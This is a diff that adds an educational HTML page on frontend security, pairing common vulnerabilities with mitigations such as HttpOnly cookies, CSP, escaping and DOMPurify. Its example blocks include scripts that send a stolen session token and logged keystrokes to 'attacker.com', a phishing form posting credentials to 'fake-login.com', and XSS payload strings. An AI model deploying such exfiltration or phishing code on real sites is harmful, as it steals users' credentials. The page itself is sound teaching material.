@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Frontend Security — Vulnerabilities & Mitigations</title>
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="default-src 'self' 'unsafe-inline'; object-src 'none';"
+    />
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        padding: 20px;
+        background: #f7f8fa;
+        color: #333;
+      }
+      section {
+        background: white;
+        border-radius: 12px;
+        margin: 20px 0;
+        padding: 20px;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+      }
+      h2 {
+        color: #c0392b;
+      }
+      h3 {
+        color: #27ae60;
+      }
+      pre {
+        background: #f4f4f4;
+        padding: 10px;
+        border-radius: 8px;
+        overflow-x: auto;
+      }
+      hr {
+        border: 1px dashed #ccc;
+        margin: 30px 0;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>🧩 Frontend Security: Vulnerabilities & Mitigations</h1>
+    <p>
+      This page demonstrates common frontend vulnerabilities and their secure
+      mitigations with examples.
+    </p>
+
+    <hr />
+
+    <!-- 1. User Session Hijacking -->
+    <section>
+      <h2>1️⃣ Vulnerability: User Session Hijacking</h2>
+      <p>
+        <strong>Problem:</strong> Session token stored in
+        <code>localStorage</code> can be stolen via XSS.
+      </p>
+
+      <pre><code>&lt;script&gt;
+  localStorage.setItem("token", "abc123");
+  // Attacker injects malicious code
+  const stolen = localStorage.getItem("token");
+  fetch("https://attacker.com/steal?token=" + stolen);
+&lt;/script&gt;
+</code></pre>
+
+      <h3>✅ Mitigation: Use HttpOnly Cookies (Server Side)</h3>
+      <p>
+        Store session tokens in cookies with <code>HttpOnly</code> and
+        <code>Secure</code> flags — inaccessible to JavaScript.
+      </p>
+    </section>
+
+    <hr />
+
+    <!-- 2. Unauthorized Activities -->
+    <section>
+      <h2>2️⃣ Vulnerability: Unauthorized Activities</h2>
+      <p><strong>Problem:</strong> API call made without authentication.</p>
+
+      <pre><code>&lt;button onclick="deleteUser(5)"&gt;Delete User&lt;/button&gt;
+&lt;script&gt;
+  function deleteUser(id) {
+    fetch(`/api/users/${id}`, { method: "DELETE" }); // ❌ no auth check
+  }
+&lt;/script&gt;
+</code></pre>
+
+      <h3>✅ Mitigation: Server Authorization Check</h3>
+      <pre><code>// Example API (server side)
+if (!req.user || !req.user.isAdmin) return 403;
+</code></pre>
+    </section>
+
+    <hr />
+
+    <!-- 3. Capturing Keystrokes -->
+    <section>
+      <h2>3️⃣ Vulnerability: Capturing Keystrokes</h2>
+      <p><strong>Problem:</strong> Malicious script logs keystrokes.</p>
+
+      <pre><code>&lt;input id="username" placeholder="Type here" /&gt;
+&lt;script&gt;
+  document.getElementById("username").addEventListener("keypress", e =&gt; {
+    fetch("https://attacker.com/log?key=" + e.key);
+  });
+&lt;/script&gt;
+</code></pre>
+
+      <h3>✅ Mitigation: Apply Content Security Policy (CSP)</h3>
+      <pre><code>&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';"&gt;
+</code></pre>
+    </section>
+
+    <hr />
+
+    <!-- 4. Stealing Critical Information -->
+    <section>
+      <h2>4️⃣ Vulnerability: Stealing Critical Information</h2>
+      <p><strong>Problem:</strong> Secret key exposed in frontend.</p>
+
+      <pre><code>&lt;script&gt;
+  const API_KEY = "SECRET_12345"; // ❌ visible to everyone
+&lt;/script&gt;
+</code></pre>
+
+      <h3>✅ Mitigation: Keep Secrets Server-Side</h3>
+      <pre><code>// Server (not frontend)
+const API_KEY = process.env.SECRET_KEY;
+</code></pre>
+    </section>
+
+    <hr />
+
+    <!-- 5. Phishing Attack -->
+    <section>
+      <h2>5️⃣ Vulnerability: Phishing Attack</h2>
+      <p>
+        <strong>Problem:</strong> Fake login form sends credentials elsewhere.
+      </p>
+
+      <pre><code>&lt;form action="https://fake-login.com/steal" method="POST"&gt;
+  &lt;input name="email" placeholder="Email"&gt;
+  &lt;input name="password" placeholder="Password" type="password"&gt;
+  &lt;button&gt;Login&lt;/button&gt;
+&lt;/form&gt;
+</code></pre>
+
+      <h3>✅ Mitigation: Verify Domains & Apply Security Headers</h3>
+      <pre><code>X-Frame-Options: DENY
+Referrer-Policy: same-origin
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+</code></pre>
+    </section>
+
+    <hr />
+
+    <!-- 6. Replace innerHTML with innerText -->
+    <section>
+      <h2>6️⃣ Mitigation: Replace innerHTML → innerText</h2>
+      <pre><code>&lt;div id="msg"&gt;&lt;/div&gt;
+&lt;script&gt;
+  const message = "&lt;img src=x onerror=alert('XSS')&gt;";
+  document.getElementById("msg").innerText = message; // ✅ safe
+&lt;/script&gt;
+</code></pre>
+    </section>
+
+    <hr />
+
+    <!-- 7. Escaping Example -->
+    <section>
+      <h2>7️⃣ Mitigation: Escaping</h2>
+      <pre><code>&lt;div id="comment"&gt;&lt;/div&gt;
+&lt;script&gt;
+  const escape = str =&gt; str
+    .replace(/&amp;/g, "&amp;amp;")
+    .replace(/&lt;/g, "&amp;lt;")
+    .replace(/&gt;/g, "&amp;gt;");
+  
+  const userInput = "&lt;script&gt;alert('XSS')&lt;/script&gt;";
+  document.getElementById("comment").innerHTML = escape(userInput); // ✅ safe
+&lt;/script&gt;
+</code></pre>
+    </section>
+
+    <hr />
+
+    <!-- 8. DOMPurify -->
+    <section>
+      <h2>8️⃣ Mitigation: DOMPurify</h2>
+      <pre><code>&lt;script src="https://unpkg.com/dompurify@3.0.6/dist/purify.min.js"&gt;&lt;/script&gt;
+&lt;div id="safe-output"&gt;&lt;/div&gt;
+&lt;script&gt;
+  const html = "&lt;img src=x onerror=alert('Hack')&gt;";
+  const clean = DOMPurify.sanitize(html);
+  document.getElementById("safe-output").innerHTML = clean; // ✅ sanitized
+&lt;/script&gt;
+</code></pre>
+    </section>
+
+    <hr />
+
+    <!-- 9. Using Library Like React -->
+    <section>
+      <h2>9️⃣ Mitigation: Using Library Like React</h2>
+      <pre><code>&lt;div id="root"&gt;&lt;/div&gt;
+&lt;script src="https://unpkg.com/react@18/umd/react.production.min.js"&gt;&lt;/script&gt;
+&lt;script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+  const e = React.createElement;
+  const App = () =&gt; e('div', null, "Hello " + "&lt;img src=x onerror=alert('XSS')&gt;");
+  ReactDOM.render(e(App), document.getElementById('root'));
+&lt;/script&gt;
+</code></pre>
+    </section>
+
+    <hr />
+
+    <footer>
+      <p><strong>Created by:</strong> Hareesh Bhittam</p>
+      <p>
+        <em
+          >Demonstration for Frontend Security — Vulnerabilities &
+          Mitigations</em
+        >
+      </p>
+    </footer>
+  </body>
+</html>
